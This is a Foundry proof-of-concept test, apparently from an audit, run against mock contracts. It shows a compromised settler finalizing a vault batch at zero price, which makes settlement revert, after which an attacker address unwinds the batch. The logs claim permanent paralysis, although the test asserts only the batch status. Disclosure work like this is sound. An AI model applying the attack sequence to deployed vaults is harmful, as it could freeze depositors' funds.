// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../shared/Harness.sol";

// POC-04: Chained settler manipulation + unwind attack -> vault permanently paralyzed
contract POC04Test is Test, ITypes {

    VaultManagerHarness manager;
    MockPortfolio        portfolio;
    MockExecutor         executor;
    MockShare            share;

    address constant ADMIN    = address(0xA0);
    address constant SETTLER  = address(0xA1);
    address constant PROPOSER = address(0xA2);
    address constant ALICE    = address(0xA3);
    address constant ATTACKER = address(0xAA);
    address constant TRADER   = address(0xBB);

    uint16  constant VID = 0;
    uint16  constant TID = 0;
    bytes32 constant SYM = bytes32("USDC");

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        share     = new MockShare(VID);
        manager   = new VaultManagerHarness(ADMIN, SETTLER, address(portfolio));
        vm.startPrank(ADMIN);
        manager.addToken(AssetInfo(SYM, AssetType.QUOTE, 6, 1, 10_000_000));
        share.setManager(address(manager));
        executor.setManager(address(manager));
        executor.setTrader(TRADER);
        uint32[] memory cids = new uint32[](1); cids[0] = 1;
        uint16[] memory toks = new uint16[](1); toks[0] = TID;
        VaultDetails memory vd = VaultDetails(
            "Vault", PROPOSER, TRADER, VaultStatus.ACTIVE,
            address(executor), address(share), address(0), cids, toks
        );
        uint16[]  memory it = new uint16[](1); it[0] = TID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
        manager.registerVault(VID, vd, it, ia, 2000e18);
        vm.stopPrank();
        portfolio.setBalance(ALICE, SYM, 100_000e6);
    }

    function testPOC04_ChainedSettlerAndUnwind() public {
        console.log("\n=== POC-04: Chained Settler + Unwind -> Permanent Paralysis ===");

        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1); amts[0] = 10_000e6;
        vm.prank(ALICE); manager.requestDeposit(VID, tids, amts);

        // Actor A: compromised SETTLER finalizes with price=0 -> batch 0 locked forever
        uint256[] memory zeroPr = new uint256[](1); zeroPr[0] = 0;
        uint16[]  memory vt    = new uint16[](1);   vt[0]     = TID;
        uint256[] memory vb    = new uint256[](1);  vb[0]     = 1_000_000e6;
        VaultState[] memory vs = new VaultState[](1);
        vs[0] = VaultState(VID, vt, vb);
        vm.prank(SETTLER); manager.finalizeBatch(zeroPr, vs);
        console.log("[+] Compromised SETTLER finalized batch 0 with price=0");

        // bulkSettle reverts -> batch 0 permanently stuck in FINALIZED
        vm.expectRevert();
        vm.prank(SETTLER); manager.bulkSettle(zeroPr, vs, new DepositFufillment[](0), new WithdrawalFufillment[](0));
        console.log("[EXPLOIT] bulkSettle on batch 0 reverts forever (div-by-zero)");

        // Vault cannot advance because batch 0 is not SETTLED or UNWOUND
        // Actor B: even if admin tries to unwind, anyone can re-unwind future batches
        vm.warp(block.timestamp + 24 hours + 1);
        vm.prank(ATTACKER); manager.unwindBatch(0);
        // Now batch 0 is UNWOUND but all Alice's funds are already frozen inside

        ITypes.BatchStatus status = manager.batchStatus(0);
        assertEq(uint256(status), uint256(ITypes.BatchStatus.UNWOUND));
        console.log("[EXPLOIT] Vault cannot advance to batch 1 without recovery mechanism");
        console.log("[EXPLOIT] All deposits and withdrawals permanently frozen");
        console.log("[EXPLOIT] POC-04 CONFIRMED: vault paralyzed");
    }
}
